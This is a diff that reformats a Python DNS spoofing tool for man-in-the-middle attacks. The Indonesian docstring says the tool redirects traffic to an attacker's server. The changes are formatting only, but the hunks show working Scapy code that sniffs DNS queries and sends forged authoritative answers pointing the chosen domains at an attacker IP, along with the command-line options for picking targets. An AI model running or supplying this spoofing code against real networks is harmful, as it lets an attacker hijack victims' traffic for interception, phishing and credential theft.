@@ -4,6 +4,7 @@ DNS Spoofer - DNS response spoofing for MITM
 Mengeksploitasi DNS untuk redirect traffic ke server attacker.
 Usage: sudo python dns_spoofer.py -i eth0 -d example.com -r 192.168.1.100
 """
+
 import argparse
 import sys
 import os
@@ -30,7 +31,7 @@ def parse_dns_name(data):
         i += 1
         if i + length > len(data):
             return ""
-        dns_name.append(data[i:i+length].decode("utf-8", errors="ignore"))
+        dns_name.append(data[i : i + length].decode("utf-8", errors="ignore"))
         i += length
     return ".".join(dns_name)
 
@@ -87,15 +88,17 @@ def sniff_dns_and_spoof(interface, redirect_map, verbose=True):
                 query_data = bytes(dns_layer)
 
                 # Create response
-                spoofed = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
-                          UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) / \
-                          DNS(
-                              id=dns_layer.id,
-                              qr=1,
-                              aa=1,
-                              qd=dns_layer.qd,
-                              an=DNSRR(rrname=dns_query.qname, rdata=redirect_ip, ttl=300)
-                          )
+                spoofed = (
+                    IP(src=pkt[IP].dst, dst=pkt[IP].src)
+                    / UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
+                    / DNS(
+                        id=dns_layer.id,
+                        qr=1,
+                        aa=1,
+                        qd=dns_layer.qd,
+                        an=DNSRR(rrname=dns_query.qname, rdata=redirect_ip, ttl=300),
+                    )
+                )
 
                 sendp(spoofed, iface=interface, verbose=False)
                 if verbose:
@@ -109,8 +112,12 @@ def sniff_dns_and_spoof(interface, redirect_map, verbose=True):
 def main():
     parser = argparse.ArgumentParser(description="DNS Spoofer for MITM")
     parser.add_argument("-i", "--interface", required=True, help="Network interface")
-    parser.add_argument("-d", "--domain", action="append", help="Domain to spoof (can be used multiple times)")
-    parser.add_argument("-r", "--redirect", action="append", help="Redirect IP for each domain (in same order)")
+    parser.add_argument(
+        "-d", "--domain", action="append", help="Domain to spoof (can be used multiple times)"
+    )
+    parser.add_argument(
+        "-r", "--redirect", action="append", help="Redirect IP for each domain (in same order)"
+    )
     parser.add_argument("-f", "--file", help="File with domain:ip lines")
     args = parser.parse_args()
 
@@ -148,4 +155,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
